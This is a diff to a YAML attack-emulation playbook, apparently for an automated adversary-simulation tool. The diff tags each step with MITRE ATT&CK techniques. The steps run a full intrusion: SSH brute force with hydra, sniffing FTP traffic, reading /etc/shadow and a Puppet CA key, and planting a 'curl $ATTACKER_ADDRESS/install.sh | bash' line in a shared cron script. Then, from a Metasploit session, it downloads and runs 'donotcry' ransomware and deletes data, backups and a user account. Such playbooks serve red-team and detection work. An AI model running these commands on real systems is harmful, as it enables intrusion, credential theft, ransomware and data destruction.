@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 3 a a
 #
 ####################
 vars:
@@ -11,6 +11,9 @@ vars:
 commands:
   - type: shell
     cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+    metadata:
+      techniques: "T1078,T1110,T1133"
+      tactics: "Initial Access"
 
   - type: ssh
     creates_session: foothold
@@ -19,11 +22,17 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078"
+      tactics: "Initial Access"
 
   - type: ssh
     session: foothold
     cmd: "tcpdump -A port 21\n"
     interactive: True
+    metadata:
+      techniques: "T1040"
+      tactics: "Credential Access"
 
   - type: sleep
     seconds: 20
@@ -38,11 +47,17 @@ commands:
     session: foothold
     cmd: "sudo -i\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
@@ -53,16 +68,25 @@ commands:
     session: foothold
     cmd: "cat /etc/shadow\n"
     interactive: True
+    metadata:
+      techniques: "T1003"
+      tactics: "Credential Access"
 
   - type: ssh
     session: foothold
     cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
     interactive: True
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
 
   - type: ssh
     session: foothold
     cmd: "cat /media/share/healthcheck_cron.sh\n"
     interactive: True
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
 
   - type: mktemp
     cmd: file
@@ -95,40 +119,64 @@ commands:
     session: foothold
     cmd: "vim /media/share/healthcheck_cron.sh\n"
     interactive: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 
   - type: ssh
     session: foothold
     cmd: "G"
     interactive: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 
   - type: ssh
     session: foothold
     cmd: "o"
     interactive: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 
   - type: ssh
     session: foothold
     cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash\n"
     interactive: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 
   - type: ssh
     session: foothold
     cmd: "1B"
     interactive: True
     bin: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 
   - type: ssh
     session: foothold
     cmd: ":wq\n"
     interactive: True
+    metadata:
+      techniques: "T1080"
+      tactics: "Lateral Movement"
 ################### MOVED ############################################
   - type: msf-session
     session: movement
     cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
     cmd: getuid
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
@@ -145,31 +193,55 @@ commands:
   - type: msf-session
     session: movement
     cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+    metadata:
+      techniques: "T1486"
+      tactics: "Impact"
 
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+    metadata:
+      techniques: "T1486,T1565"
+      tactics: "Impact"
 
   - type: msf-session
     session: movement
     cmd: find /media/data/Images
+    metadata:
+      techniques: "T1018"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
     cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087"
+      tactics: "Discovery"
   
   - type: msf-session
     session: movement
     cmd: userdel -f john
+    metadata:
+      techniques: "T1531"
+      tactics: "Impact"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
+    metadata:
+     techniques: "T1485"
+     tactics: "Impact"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
-  
+    metadata:
+     techniques: "T1490"
+     tactics: "Impact"
+
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
+    metadata:
+     techniques: "T1489"
+     tactics: "Impact"
